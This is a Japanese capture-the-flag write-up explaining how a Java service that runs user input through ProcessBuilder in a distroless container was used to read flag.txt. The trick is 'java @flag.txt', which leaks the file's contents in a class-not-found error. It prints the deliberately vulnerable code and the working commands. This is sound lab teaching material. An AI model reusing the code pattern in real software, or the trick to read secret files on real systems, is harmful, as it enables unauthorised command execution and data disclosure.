# Anyrunner Writeup
日付: 2026-07-30  
カテゴリ: Misc 

---

## 問題概要
この問題は、ユーザが送信した 1 行の文字列をそのまま `ProcessBuilder` に渡して  
「OS コマンドを実行できるように見せかける」タイプの misc 問題である。

しかし実際には **distroless Java コンテナ**で動作しており、  
通常の OS コマンドはほぼ存在しない。  
唯一実行可能なのは `/usr/bin/java` のみである。

この制約下で、コンテナ内に存在する `flag.txt` を読み出す方法を探すのが本問題の本質である。
- 入力は空白区切りで分割され、最初のトークンが実行ファイルとして扱われる
- 標準出力はそのままクライアントに返される
- OSコマンドは使用できない

```
$ ls
Error
$ /bin/sh
Error
$ cat flag
Error
```
- javaは存在している

```
$ /usr/bin/java -version
openjdk version "25.0.3"

$ /proc/self/exe
jspawnhelper version 25.0.3+9-LTS
Error

$ java -jar app.jar
Unable to access jarfile app.jar
Error

```

## 問題コード

```java
var process = new ProcessBuilder(line.strip().split("\\s+"))
    .redirectErrorStream(true).start();
process.getOutputStream().close();
process.getInputStream().transferTo(output);
if (process.waitFor() != 0) output.write("Error\n".getBytes());
```
---

## Java の @argfile 機能
- Java には argument file（@argfile） という機能がある。

```
java @file
```
とすると、file の内容を コマンドライン引数として読み込む。
distroless でもこの機能は有効である。
そしてこの問題では、コンテナ内に flag.txt が存在している。

## 解法
```
$ java @flag.txt
Error: Could not find or load main class Alpaca{DUMMY}
Caused by: java.lang.ClassNotFoundException: Alpaca{DUMMY}
Error
```

Java は @argfile の内容を「クラス名」として解釈するため、flag.txt 内の文字列が
`ClassNotFoundException` のエラーメッセージとしてそのまま露出する。
これにより flag を取得できる。

## まとめ
今回の問題はOSコマンドが使用できなくJavaを使用している。
初めはプロセスを調べ、親のプロセスのパスを調べていたがFlagには辿り着かなかった。
Javaには @argfile機能があることを知り、Flagのファイルを調べると見つかった。
